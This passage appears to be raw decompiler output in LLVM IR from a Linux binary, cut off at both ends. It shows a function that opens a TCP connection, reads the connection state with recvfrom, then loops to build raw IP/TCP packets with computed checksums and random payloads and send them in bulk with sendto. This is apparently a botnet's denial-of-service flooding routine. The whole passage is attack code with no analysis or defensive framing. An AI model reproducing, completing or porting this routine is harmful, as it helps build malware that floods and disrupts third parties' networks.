  store i32 16, i32* %r2.global-to-local, align 4
  %v0_9890 = load i32, i32* @r8, align 4
  store i32 %v0_9890, i32* %r0.global-to-local, align 4
  %v3_9894 = call i32 @__libc_connect(i32 %v0_9890, i32 %v2_9888, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_989c = call i32 @__GI_time(i32* null)
  store i32 %v2_989c, i32* %r0.global-to-local, align 4
  store i32 %v2_98a0, i32* @r7, align 4
  store i32 %v2_989c, i32* @r4, align 4
  store i32 %v2_98a8, i32* @r6, align 4
  store i32 %v2_98ac, i32* @r5, align 4
  %v9_9900 = icmp eq i32 %tmp34, %v0_9b90
  %v4_9928 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_9900 to i32
  %v9_9914 = icmp eq i1 %v9_9900, false
  %v9_992c = icmp eq i32 %v3_9920, %v4_9928
  br label %dec_label_pc_98c4

dec_label_pc_98b4:                                ; preds = %.thread, %dec_label_pc_991c, %dec_label_pc_9944, %bb76
  %v2_98b4 = call i32 @__GI_time(i32* null)
  %v0_98b8 = load i32, i32* @r4, align 4
  %v2_98b8 = sub i32 %v2_98b4, %v0_98b8
  store i32 %v2_98b8, i32* %r0.global-to-local, align 4
  %v8_98c0 = icmp sgt i32 %v2_98b8, 10
  br i1 %v8_98c0, label %dec_label_pc_994c, label %dec_label_pc_98c4

dec_label_pc_98c4:                                ; preds = %dec_label_pc_98b4, %dec_label_pc_9888
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 %v2_98a8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_98d4 = load i32, i32* @sl, align 4
  store i32 %v0_98d4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_98e4 = call i32 @__libc_recvfrom(i32 %v0_98d4, i32 %v2_98a8, i32 256, i32 16384, i32 %v2_98a0, i32 %v2_98ac)
  store i32 %v6_98e4, i32* %r2.global-to-local, align 4
  %v7_98ec = icmp eq i32 %v6_98e4, -1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_98ec, label %dec_label_pc_9aec, label %dec_label_pc_98f8

dec_label_pc_98f8:                                ; preds = %dec_label_pc_98c4
  store i32 %v0_9b90, i32* @r1, align 4
  store i32 %tmp34, i32* @r3, align 4
  store i32 %., i32* @lr, align 4
  %tmp100 = icmp ult i32 %v6_98e4, 41
  br i1 %tmp100, label %.thread, label %bb76

.thread:                                          ; preds = %dec_label_pc_98f8
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_98b4

bb76:                                             ; preds = %dec_label_pc_98f8
  br i1 %v9_9914, label %dec_label_pc_98b4, label %dec_label_pc_991c

dec_label_pc_991c:                                ; preds = %bb76
  store i32 %v3_9920, i32* @lr, align 4
  store i32 %v2_9840, i32* @r3, align 4
  store i32 %v4_9928, i32* %r2.global-to-local, align 4
  br i1 %v9_992c, label %dec_label_pc_9934, label %dec_label_pc_98b4

dec_label_pc_9934:                                ; preds = %dec_label_pc_991c
  store i32 %v4_9934, i32* %r2.global-to-local, align 4
  store i32 %v1_9938, i32* @r3, align 4
  br i1 %v2_993c, label %dec_label_pc_9b84, label %dec_label_pc_9944

dec_label_pc_9944:                                ; preds = %dec_label_pc_9934
  br i1 %v2_9944, label %dec_label_pc_98b4, label %dec_label_pc_994c

dec_label_pc_994c:                                ; preds = %dec_label_pc_9944, %dec_label_pc_98b4
  %v0_994c = load i32, i32* @r8, align 4
  store i32 %v0_994c, i32* %r0.global-to-local, align 4
  %v1_9950 = call i32 @__GI___libc_close(i32 %v0_994c)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9960 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_9960, i32* %r0.global-to-local, align 4
  %v3_9964 = icmp eq i32 %v3_9960, -1
  store i32 %v3_9960, i32* @r8, align 4
  br i1 %v3_9964, label %dec_label_pc_9970, label %dec_label_pc_9818

dec_label_pc_9970:                                ; preds = %dec_label_pc_994c, %dec_label_pc_97fc
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_97fc ], [ %stack_var_-62.2, %dec_label_pc_994c ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_97fc ], [ %v0_9b90, %dec_label_pc_994c ]
  %v3_9970 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_9978 = add i32 %v3_9970, 1
  store i32 %v1_9978, i32* @r3, align 4
  store i32 %v1_9978, i32* %stack_var_-44, align 4
  %v5_9984 = icmp slt i32 %v1_9978, %arg2
  br i1 %v5_9984, label %dec_label_pc_97fc, label %dec_label_pc_9988.preheader

dec_label_pc_9988.preheader:                      ; preds = %.thread10, %dec_label_pc_9970, %dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge
  %v1_99c0.pre-phi = phi i32 [ %.pre94, %dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge ], [ %v1_9bec, %dec_label_pc_9970 ], [ %v1_9bec, %.thread10 ]
  %v4_9aa4.pre-phi = phi i32 [ %.pre, %dec_label_pc_97e0.dec_label_pc_9988.preheader_crit_edge ], [ %v4_9c2c, %dec_label_pc_9970 ], [ %v4_9c2c, %.thread10 ]
  %v3_99a0 = mul i32 %v6_9764, 65536
  %v1_99a4 = add i32 %v3_99a0, 1310720
  %tmp78 = udiv i32 %v1_99a4, 256
  %v3_99b0 = and i32 %tmp78, 65280
  %v2_9abc = icmp eq i32 %v1_9784, 0
  %v4_99b4 = udiv i32 %v1_99a4, 16777216
  %v5_99b4 = or i32 %v3_99b0, %v4_99b4
  %v1_99bc = add i32 %v6_9764, 20
  br label %dec_label_pc_9988

dec_label_pc_9988:                                ; preds = %dec_label_pc_9988.preheader, %dec_label_pc_9b6c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_97ec, label %dec_label_pc_9b6c, label %dec_label_pc_999c

dec_label_pc_999c:                                ; preds = %dec_label_pc_9988
  store i32 %v1_99a4, i32* %r2.global-to-local, align 4
  store i32 %v6_9764, i32* %ip.global-to-local, align 4
  store i32 %v3_99b0, i32* %r3.global-to-local, align 4
  store i32 %v5_99b4, i32* @sb, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_99bc, i32* @r8, align 4
  store i32 %v1_99c0.pre-phi, i32* @r7, align 4
  br label %dec_label_pc_9ab8

dec_label_pc_99c8:                                ; preds = %dec_label_pc_9ab8, %dec_label_pc_9ac4
  %v2_99cc = phi i32 [ %v7_9aa0, %dec_label_pc_9ab8 ], [ %v2_99cc.pre, %dec_label_pc_9ac4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_99cc = add i32 %v2_99cc, 10
  %v4_99cc = inttoptr i32 %v3_99cc to i16*
  store i16 0, i16* %v4_99cc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_99d4 = load i32, i32* @r5, align 4
  store i32 %v0_99d4, i32* @r0, align 4
  %v2_99d8 = call i32 @checksum_generic(i32 %v0_99d4, i32 20)
  %v3_99d8 = trunc i32 %v2_99d8 to i16
  store i32 %v2_99d8, i32* %r0.global-to-local, align 4
  %v3_99dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_95e0, i32* %ip.global-to-local, align 4
  %v3_99e4 = mul i32 %v3_99dc, 16
  %v2_99e8 = add i32 %v3_99e4, %v2_95e0
  store i32 %v2_99e8, i32* %r1.global-to-local, align 4
  %v1_99ec = add i32 %v2_99e8, 4
  %v2_99ec = inttoptr i32 %v1_99ec to i32*
  %v3_99ec = load i32, i32* %v2_99ec, align 4
  %v3_99f0 = mul i32 %v3_99ec, 65536
  store i32 %v3_99f0, i32* %ip.global-to-local, align 4
  %tmp79 = mul i32 %v3_99ec, 256
  %v1_99f8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v3_99ec, 256
  %v4_99fc = urem i32 %tmp80, 256
  %v5_99fc = or i32 %v4_99fc, %v1_99f8
  store i32 %v5_99fc, i32* %r3.global-to-local, align 4
  %v1_9a00 = add i32 %v3_99ec, 1
  store i32 %v1_9a00, i32* %r2.global-to-local, align 4
  store i32 %v1_9a00, i32* %v2_99ec, align 4
  %v0_9a08 = load i32, i32* %r3.global-to-local, align 4
  %v1_9a08 = load i32, i32* @r6, align 4
  %v2_9a08 = add i32 %v1_9a08, 4
  %v3_9a08 = inttoptr i32 %v2_9a08 to i32*
  store i32 %v0_9a08, i32* %v3_9a08, align 4
  %v0_9a0c = load i32, i32* %r1.global-to-local, align 4
  %v1_9a0c = add i32 %v0_9a0c, 8
  %v2_9a0c = inttoptr i32 %v1_9a0c to i32*
  %v3_9a0c = load i32, i32* %v2_9a0c, align 4
  %tmp81 = mul i32 %v3_9a0c, 256
  %v1_9a18 = and i32 %tmp81, 65280
  %tmp82 = udiv i32 %v3_9a0c, 256
  %v4_9a1c = urem i32 %tmp82, 256
  %v5_9a1c = or i32 %v4_9a1c, %v1_9a18
  store i32 %v5_9a1c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v3_9a24 = load i32, i32* @r5, align 4
  %v4_9a24 = add i32 %v3_9a24, 10
  %v5_9a24 = inttoptr i32 %v4_9a24 to i16*
  store i16 %v3_99d8, i16* %v5_9a24, align 2
  %v0_9a28 = load i32, i32* %r3.global-to-local, align 4
  %v1_9a28 = load i32, i32* @r6, align 4
  %v2_9a28 = add i32 %v1_9a28, 8
  %v3_9a28 = inttoptr i32 %v2_9a28 to i32*
  store i32 %v0_9a28, i32* %v3_9a28, align 4
  %v0_9a2c = load i32, i32* @lr, align 4
  %v1_9a2c = trunc i32 %v0_9a2c to i16
  %v2_9a2c = load i32, i32* @r6, align 4
  %v3_9a2c = add i32 %v2_9a2c, 16
  %v4_9a2c = inttoptr i32 %v3_9a2c to i16*
  store i16 %v1_9a2c, i16* %v4_9a2c, align 2
  %v0_9a30 = load i32, i32* @r6, align 4
  store i32 %v0_9a30, i32* @r1, align 4
  %v0_9a34 = load i32, i32* @sb, align 4
  store i32 %v0_9a34, i32* %r2.global-to-local, align 4
  %v0_9a38 = load i32, i32* @r8, align 4
  store i32 %v0_9a38, i32* %r3.global-to-local, align 4
  %v0_9a3c = load i32, i32* @r5, align 4
  store i32 %v0_9a3c, i32* %r0.global-to-local, align 4
  %v4_9a40 = call i32 @checksum_tcpudp(i32 %v0_9a3c, i32 %v0_9a30, i32 %v0_9a34, i32 %v0_9a38)
  %v5_9a40 = trunc i32 %v4_9a40 to i16
  store i32 %v4_9a40, i32* %r0.global-to-local, align 4
  %v3_9a44 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9a44, i32* %r3.global-to-local, align 4
  %v3_9a48 = mul i32 %v3_9a44, 32
  store i32 %v3_9a48, i32* %lr.global-to-local, align 4
  %v3_9a4c = load i32, i32* @r6, align 4
  %v4_9a4c = add i32 %v3_9a4c, 16
  %v5_9a4c = inttoptr i32 %v4_9a4c to i16*
  store i16 %v5_9a40, i16* %v5_9a4c, align 2
  %v0_9a50 = load i32, i32* %lr.global-to-local, align 4
  %v1_9a50 = load i32, i32* %r3.global-to-local, align 4
  %tmp101 = mul i32 %v1_9a50, -8
  %v5_9a50 = add i32 %v0_9a50, %tmp101
  store i32 %v5_9a50, i32* %lr.global-to-local, align 4
  %v0_9a54 = load i32, i32* @r6, align 4
  %v1_9a54 = add i32 %v0_9a54, 2
  %v2_9a54 = inttoptr i32 %v1_9a54 to i16*
  %v3_9a54 = load i16, i16* %v2_9a54, align 2
  %v4_9a54 = zext i16 %v3_9a54 to i32
  store i32 %v4_9a54, i32* @r6, align 4
  %v1_9a58 = load i32, i32* @fp, align 4
  %v2_9a58 = add i32 %v1_9a58, %v5_9a50
  store i32 %v2_9a58, i32* @lr, align 4
  %v3_9a5c = add i32 %v2_9a58, 2
  %v4_9a5c = inttoptr i32 %v3_9a5c to i16*
  store i16 %v3_9a54, i16* %v4_9a5c, align 2
  %v0_9a60 = load i32, i32* @r5, align 4
  store i32 %v0_9a60, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_9a6c = load i32, i32* @sl, align 4
  store i32 %v0_9a6c, i32* %r0.global-to-local, align 4
  %v0_9a70 = load i32, i32* @r7, align 4
  store i32 %v0_9a70, i32* %r2.global-to-local, align 4
  %v0_9a74 = load i32, i32* @lr, align 4
  %v6_9a7c = call i32 @__libc_sendto(i32 %v0_9a6c, i32 %v0_9a60, i32 %v0_9a70, i32 16384, i32 %v0_9a74, i32 16)
  %v3_9a80 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9a80, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v1_9a88 = add i32 %v3_9a80, 1
  store i32 %v1_9a88, i32* %r0.global-to-local, align 4
  store i32 %v1_9a88, i32* %stack_var_-44, align 4
  %v7_9a94 = icmp slt i32 %v1_9a88, %arg2
  br i1 %v7_9a94, label %dec_label_pc_9ab8, label %dec_label_pc_9b6c

dec_label_pc_9ab8:                                ; preds = %dec_label_pc_999c, %dec_label_pc_99c8
  %v1_9aa0 = phi i32 [ %v1_9a88, %dec_label_pc_99c8 ], [ 0, %dec_label_pc_999c ]
  store i32 %v2_95f0, i32* @lr, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_9aa0 = mul i32 %v1_9aa0, 4
  %v5_9aa0 = add i32 %v4_9aa0, %v2_95f0
  %v6_9aa0 = inttoptr i32 %v5_9aa0 to i32*
  %v7_9aa0 = load i32, i32* %v6_9aa0, align 4
  store i32 %v7_9aa0, i32* @r5, align 4
  store i32 %v4_9aa4.pre-phi, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_9ab0 = add i32 %v7_9aa0, 20
  store i32 %v1_9ab0, i32* @r6, align 4
  store i32 %v1_9784, i32* %r1.global-to-local, align 4
  br i1 %v2_9abc, label %dec_label_pc_99c8, label %dec_label_pc_9ac4

dec_label_pc_9ac4:                                ; preds = %dec_label_pc_9ab8
  %v1_9ac4 = add i32 %v7_9aa0, 40
  store i32 %v1_9ac4, i32* @r4, align 4
  store i32 %v1_9ac4, i32* %r0.global-to-local, align 4
  store i32 %v6_9764, i32* %r1.global-to-local, align 4
  %v2_9ad0 = call i32 @rand_alphastr(i32 %v1_9ac4, i32 %v6_9764)
  store i32 %v2_9ad0, i32* %r0.global-to-local, align 4
  store i32 %v6_9764, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9adc = load i32, i32* @r4, align 4
  %v4_9adc = add i32 %v2_9adc, %v6_9764
  %v5_9adc = inttoptr i32 %v4_9adc to i8*
  store i8 0, i8* %v5_9adc, align 1
  %v2_99cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_99c8

dec_label_pc_9ae4:                                ; preds = %dec_label_pc_97b8
  %v0_9ae4 = load i32, i32* @sl, align 4
  store i32 %v0_9ae4, i32* %r0.global-to-local, align 4
  %v1_9ae8 = call i32 @__GI___libc_close(i32 %v0_9ae4)
  store i32 %v1_9ae8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9aec

dec_label_pc_9aec:                                ; preds = %dec_label_pc_98c4, %dec_label_pc_9b6c, %entry, %dec_label_pc_9ae4
  %v1_9af4 = phi i32 [ %v3_97a8, %entry ], [ %v1_9ae8, %dec_label_pc_9ae4 ], [ %v2_9b70, %dec_label_pc_9b6c ], [ 0, %dec_label_pc_98c4 ]
  store i32 %v3_95b4, i32* %r4.global-to-local, align 4
  store i32 %v27_95b4, i32* %lr.global-to-local, align 4
  ret i32 %v1_9af4

dec_label_pc_9af8:                                ; preds = %bb72
  %v1_9af8 = add i32 %v4_985c, 16
  %v2_9af8 = inttoptr i32 %v1_9af8 to i32*
  %v3_9af8 = load i32, i32* %v2_9af8, align 4
  store i32 %v3_9af8, i32* @r4, align 4
  %v0_9afc = call i32 @rand_next()
  store i32 %v0_9afc, i32* %r0.global-to-local, align 4
  %v3_9b00 = load i32, i32* %stack_var_-44, align 4
  %v5_9b08 = mul i32 %v3_9b00, 24
  %v0_9b0c = load i32, i32* @r4, align 4
  %v1_9b0c = and i32 %v0_9b0c, 16711680
  store i32 %v1_9b0c, i32* %ip.global-to-local, align 4
  %v3_9b10 = udiv i32 %v0_9b0c, 16777216
  %v4_9b14 = udiv i32 %v1_9b0c, 256
  %v5_9b14 = or i32 %v4_9b14, %v3_9b10
  store i32 %v5_9b14, i32* %r2.global-to-local, align 4
  %v1_9b18 = load i32, i32* @fp, align 4
  %v2_9b18 = add i32 %v1_9b18, %v5_9b08
  store i32 %v2_9b18, i32* %r1.global-to-local, align 4
  %v1_9b1c = and i32 %v0_9b0c, 65280
  store i32 %v1_9b1c, i32* %r3.global-to-local, align 4
  %v1_9b20 = add i32 %v2_9b18, 20
  %v2_9b20 = inttoptr i32 %v1_9b20 to i8*
  %v3_9b20 = load i8, i8* %v2_9b20, align 1
  %v4_9b20 = zext i8 %v3_9b20 to i32
  store i32 %v4_9b20, i32* %ip.global-to-local, align 4
  %v5_9b28 = call i32 @llvm.bswap.i32(i32 %v0_9b0c)
  %v7_9b2c = lshr i32 %v0_9afc, %v4_9b20
  %v8_9b2c = add i32 %v7_9b2c, %v5_9b28
  store i32 %v8_9b2c, i32* %r2.global-to-local, align 4
  %v1_9b30 = and i32 %v8_9b2c, 16711680
  store i32 %v1_9b30, i32* %r0.global-to-local, align 4
  %v1_9b3c = and i32 %v8_9b2c, 65280
  store i32 %v1_9b3c, i32* %r1.global-to-local, align 4
  %v5_9b44 = call i32 @llvm.bswap.i32(i32 %v8_9b2c)
  store i32 %v5_9b44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9864

dec_label_pc_9b50:                                ; preds = %dec_label_pc_9864
  %v0_9b50 = call i32 @rand_next()
  %v1_9b50 = trunc i32 %v0_9b50 to i16
  store i32 %v0_9b50, i32* %r0.global-to-local, align 4
  store i32 %v2_9840, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9888

dec_label_pc_9b6c:                                ; preds = %dec_label_pc_99c8, %dec_label_pc_9988
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9b70 = call i32 @__GI_time(i32* null)
  store i32 %v2_9b70, i32* %r0.global-to-local, align 4
  store i32 %v2_9794, i32* %r2.global-to-local, align 4
  %v6_9b7c = icmp slt i32 %v2_9794, %v2_9b70
  br i1 %v6_9b7c, label %dec_label_pc_9aec, label %dec_label_pc_9988

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9934
  %v3_9b84 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9b84, i32* @r5, align 4
  store i32 %v2_95e0, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r0.global-to-local, align 4
  %v5_9b90 = mul i32 %v3_9b84, 16
  %v6_9b90 = add i32 %v5_9b90, %v2_95e0
  %v7_9b90 = inttoptr i32 %v6_9b90 to i32*
  store i32 %v0_9b90, i32* %v7_9b90, align 4
  %v0_9b94 = load i32, i32* %r0.global-to-local, align 4
  %v1_9b94 = add i32 %v0_9b94, 4
  %v2_9b94 = inttoptr i32 %v1_9b94 to i32*
  %v3_9b94 = load i32, i32* %v2_9b94, align 4
  %v1_9b98 = and i32 %v3_9b94, 16711680
  store i32 %v1_9b98, i32* %r0.global-to-local, align 4
  %v5_9bac = call i32 @llvm.bswap.i32(i32 %v3_9b94)
  store i32 %v5_9bac, i32* %r3.global-to-local, align 4
  store i32 %v2_95e0, i32* %r1.global-to-local, align 4
  %v0_9bb4 = load i32, i32* @r5, align 4
  %v3_9bb4 = mul i32 %v0_9bb4, 16
  %v2_9bb8 = add i32 %v3_9bb4, %v2_95e0
  store i32 %v2_9bb8, i32* %ip.global-to-local, align 4
  %v2_9bbc = add i32 %v2_9bb8, 4
  %v3_9bbc = inttoptr i32 %v2_9bbc to i32*
  store i32 %v5_9bac, i32* %v3_9bbc, align 4
  store i32 %stack_var_-340.0.ph, i32* %r2.global-to-local, align 4
  %v1_9bc4 = add i32 %stack_var_-340.0.ph, 8
  %v2_9bc4 = inttoptr i32 %v1_9bc4 to i32*
  %v3_9bc4 = load i32, i32* %v2_9bc4, align 4
  %v1_9bd0 = and i32 %v3_9bc4, 65280
  store i32 %v1_9bd0, i32* %r2.global-to-local, align 4
  %v5_9bdc = call i32 @llvm.bswap.i32(i32 %v3_9bc4)
  store i32 %v5_9bdc, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-340.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v6_9764, i32* %r0.global-to-local, align 4
  %v1_9be8 = add i32 %stack_var_-340.0.ph, 2
  %v2_9be8 = inttoptr i32 %v1_9be8 to i16*
  %v3_9be8 = load i16, i16* %v2_9be8, align 2
  %v4_9be8 = zext i16 %v3_9be8 to i32
  store i32 %v4_9be8, i32* %r1.global-to-local, align 4
  store i32 %v1_9bec, i32* @r4, align 4
  %v2_9bf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_9bf0 = add i32 %v2_9bf0, 12
  %v4_9bf0 = inttoptr i32 %v3_9bf0 to i16*
  store i16 %v3_9be8, i16* %v4_9bf0, align 2
  %v0_9bf4 = load i32, i32* @lr, align 4
  %v1_9bf4 = trunc i32 %v0_9bf4 to i16
  %v2_9bf4 = load i32, i32* %ip.global-to-local, align 4
  %v3_9bf4 = add i32 %v2_9bf4, 14
  %v4_9bf4 = inttoptr i32 %v3_9bf4 to i16*
  store i16 %v1_9bf4, i16* %v4_9bf4, align 2
  %v0_9bf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9bf8 = load i32, i32* %ip.global-to-local, align 4
  %v2_9bf8 = add i32 %v1_9bf8, 8
  %v3_9bf8 = inttoptr i32 %v2_9bf8 to i32*
  store i32 %v0_9bf8, i32* %v3_9bf8, align 4
  %v0_9bfc = load i32, i32* @r4, align 4
  store i32 %v0_9bfc, i32* @r0, align 4
  %v0_9c00 = call i32 @malloc()
  store i32 %v0_9c00, i32* %r0.global-to-local, align 4
  store i32 %v2_95f0, i32* %r3.global-to-local, align 4
  %v2_9c0c = load i32, i32* @r5, align 4
  %v5_9c0c = mul i32 %v2_9c0c, 4
  %v6_9c0c = add i32 %v5_9c0c, %v2_95f0
  %v7_9c0c = inttoptr i32 %v6_9c0c to i32*
  store i32 %v0_9c00, i32* %v7_9c0c, align 4
  %v3_9c10 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9c10, i32* %r2.global-to-local, align 4
  %v0_9c14 = load i32, i32* %r3.global-to-local, align 4
  %v4_9c14 = mul i32 %v3_9c10, 4
  %v5_9c14 = add i32 %v0_9c14, %v4_9c14
  %v6_9c14 = inttoptr i32 %v5_9c14 to i32*
  %v7_9c14 = load i32, i32* %v6_9c14, align 4
  store i32 %v7_9c14, i32* %ip.global-to-local, align 4
  %v1_9c18 = inttoptr i32 %v7_9c14 to i8*
  %v2_9c18 = load i8, i8* %v1_9c18, align 1
  %tmp102 = urem i8 %v2_9c18, 16
  %v1_9c1c = zext i8 %tmp102 to i32
  %v1_9c20 = or i32 %v1_9c1c, 64
  store i32 %v1_9c20, i32* %r3.global-to-local, align 4
  %v1_9c24 = trunc i32 %v1_9c20 to i8
  store i8 %v1_9c24, i8* %v1_9c18, align 1
  %v0_9c28 = load i32, i32* %ip.global-to-local, align 4
  %v1_9c28 = inttoptr i32 %v0_9c28 to i8*
  %v2_9c28 = load i8, i8* %v1_9c28, align 1
  store i32 %v4_9c2c, i32* %lr.global-to-local, align 4
  %v1_9c30 = and i8 %v2_9c28, -16
  %v1_9c3c = or i8 %v1_9c30, 5
  %v0_9c40 = load i32, i32* @r4, align 4
  %v3_9c40 = mul i32 %v0_9c40, 65536
  store i32 %v3_9c40, i32* %r4.global-to-local, align 4
  store i32 %v5_9c44, i32* %r1.global-to-local, align 4
  store i32 %v1_9670, i32* %r0.global-to-local, align 4
  store i8 %v1_9c3c, i8* %v1_9c28, align 1
  %v0_9c50 = load i32, i32* %r1.global-to-local, align 4
  %v1_9c50 = trunc i32 %v0_9c50 to i16
  %v2_9c50 = load i32, i32* %ip.global-to-local, align 4
  %v3_9c50 = add i32 %v2_9c50, 4
  %v4_9c50 = inttoptr i32 %v3_9c50 to i16*
  store i16 %v1_9c50, i16* %v4_9c50, align 2
  %v0_9c54 = load i32, i32* %r4.global-to-local, align 4
  %v3_9c54 = udiv i32 %v0_9c54, 256
  %v1_9c5c = and i32 %v3_9c54, 65280
  store i32 %v1_9c5c, i32* %r2.global-to-local, align 4
  %v2_9c60 = load i32, i32* %ip.global-to-local, align 4
  %v3_9c60 = add i32 %v2_9c60, 1
  %v4_9c60 = inttoptr i32 %v3_9c60 to i8*
  store i8 %v5_9628, i8* %v4_9c60, align 1
  %v0_9c64 = load i32, i32* %r2.global-to-local, align 4
  %v1_9c64 = load i32, i32* %r4.global-to-local, align 4
  %v4_9c64 = udiv i32 %v1_9c64, 16777216
  %v5_9c64 = or i32 %v4_9c64, %v0_9c64
  %v1_9c68 = trunc i32 %v5_9c64 to i16
  %v2_9c68 = load i32, i32* %ip.global-to-local, align 4
  %v3_9c68 = add i32 %v2_9c68, 2
  %v4_9c68 = inttoptr i32 %v3_9c68 to i16*
  store i16 %v1_9c68, i16* %v4_9c68, align 2
  %v0_9c70 = load i32, i32* %ip.global-to-local, align 4
  %v1_9c70 = add i32 %v0_9c70, 20
  store i32 %v1_9c70, i32* %r3.global-to-local, align 4
  %v3_9c74 = add i32 %v0_9c70, 8
  %v4_9c74 = inttoptr i32 %v3_9c74 to i8*
  store i8 %v5_9660, i8* %v4_9c74, align 1
  %v0_9c78 = load i32, i32* %r3.global-to-local, align 4
  %v2_9c80 = load i32, i32* %ip.global-to-local, align 4
  %v3_9c80 = add i32 %v2_9c80, 9
  %v4_9c80 = inttoptr i32 %v3_9c80 to i8*
  store i8 6, i8* %v4_9c80, align 1
  store i32 ptrtoint (i32* @global_var_23a2c.55 to i32), i32* %r2.global-to-local, align 4
  %v2_9c88 = load i32, i32* @global_var_23a2c.55, align 4
  store i32 %v2_9c88, i32* %r1.global-to-local, align 4
  %v1_9c8c = load i32, i32* %ip.global-to-local, align 4
  %v2_9c8c = add i32 %v1_9c8c, 12
  %v3_9c8c = inttoptr i32 %v2_9c8c to i32*
  store i32 %v2_9c88, i32* %v3_9c8c, align 4
  %v0_9c90 = load i32, i32* %r0.global-to-local, align 4
  %v2_9c90 = icmp eq i32 %v0_9c90, 0
  %v3_9c94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9c94, i32* %r3.global-to-local, align 4
  store i32 %v2_95e0, i32* %r0.global-to-local, align 4
  br i1 %v2_9c90, label %.thread10, label %bb83

bb83:                                             ; preds = %dec_label_pc_9b84
  store i32 64, i32* %lr.global-to-local, align 4
  %v3_9ca0 = load i32, i32* %ip.global-to-local, align 4
  %v4_9ca0 = add i32 %v3_9ca0, 6
  %v5_9ca0 = inttoptr i32 %v4_9ca0 to i16*
  store i16 64, i16* %v5_9ca0, align 2
  %v0_9ca4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_9ca4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_9b84, %bb83
  %v0_9ca8 = phi i32 [ %v3_9c94, %dec_label_pc_9b84 ], [ %v1_9ca4.pre, %bb83 ]
  %v1_9cac = phi i32 [ %v2_95e0, %dec_label_pc_9b84 ], [ %v0_9ca4.pre, %bb83 ]
  %v4_9ca4 = mul i32 %v0_9ca8, 16
  %v5_9ca4 = add i32 %v4_9ca4, %v1_9cac
  %v6_9ca4 = inttoptr i32 %v5_9ca4 to i32*
  %v7_9ca4 = load i32, i32* %v6_9ca4, align 4
  store i32 %v7_9ca4, i32* %r2.global-to-local, align 4
  store i32 %v5_9ca4, i32* %r3.global-to-local, align 4
  %v1_9cb0 = load i32, i32* %ip.global-to-local, align 4
  %v2_9cb0 = add i32 %v1_9cb0, 16
  %v3_9cb0 = inttoptr i32 %v2_9cb0 to i32*
  store i32 %v7_9ca4, i32* %v3_9cb0, align 4
  %v0_9cb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9cb4 = add i32 %v0_9cb4, 12
  %v2_9cb4 = inttoptr i32 %v1_9cb4 to i16*
  %v3_9cb4 = load i16, i16* %v2_9cb4, align 2
  %v4_9cb4 = zext i16 %v3_9cb4 to i32
  store i32 %v4_9cb4, i32* %r1.global-to-local, align 4
  %v0_9cb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_9cb8 = add i32 %v0_9cb8, 40
  store i32 %v1_9cb8, i32* @r4, align 4
  %v3_9cbc = add i32 %v0_9cb8, 20
  %v4_9cbc = inttoptr i32 %v3_9cbc to i16*
  store i16 %v3_9cb4, i16* %v4_9cbc, align 2
  store i32 %v0_9c78, i32* %ip.global-to-local, align 4
  %v0_9cc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9cc4 = add i32 %v0_9cc4, 8
  %v2_9cc4 = inttoptr i32 %v1_9cc4 to i32*
  %v3_9cc4 = load i32, i32* %v2_9cc4, align 4
  store i32 %v3_9cc4, i32* %r1.global-to-local, align 4
  %v2_9cc8 = add i32 %v0_9c78, 4
  %v3_9cc8 = inttoptr i32 %v2_9cc8 to i32*
  store i32 %v3_9cc4, i32* %v3_9cc8, align 4
  %v0_9ccc = load i32, i32* %ip.global-to-local, align 4
